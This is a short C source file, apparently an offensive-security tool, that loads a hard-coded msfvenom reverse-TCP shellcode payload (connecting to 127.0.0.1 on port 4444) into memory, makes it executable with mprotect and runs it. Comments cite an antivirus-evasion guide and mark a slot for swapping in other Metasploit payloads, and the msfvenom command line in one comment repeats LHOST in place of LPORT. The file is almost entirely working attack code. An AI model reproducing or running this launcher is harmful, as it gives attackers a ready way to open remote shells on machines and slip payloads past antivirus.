/*

Simple ELF shellcode runner

Reference:
	* https://tuttlem.github.io/2017/10/28/executing-shellcode-in-c.html 
	* https://stackoverflow.com/questions/27900201/create-and-test-x86-64-elf-executable-shellcode-on-a-linux-machine
	* https://man7.org/linux/man-pages/man2/mprotect.2.html
	* https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
*/
#include <unistd.h>
#include <sys/mman.h>

#define SCSSIZE 123

// handcrafted payload here
// msfvenom -p linux/x86/shell/reverse_tcp LHOST=4444 LHOST=127.0.0.1 -f c
unsigned char PAYLOAD[SCSSIZE] = 
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb2\x24\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";

// msf template below
//unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";

int main(int argc, char *argv[]) {

	// create executable memory
    mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
    int (*exeshell)() = (int (*)()) PAYLOAD;  
    (int)(*exeshell)(); // execute shellcode

	return 0;
}
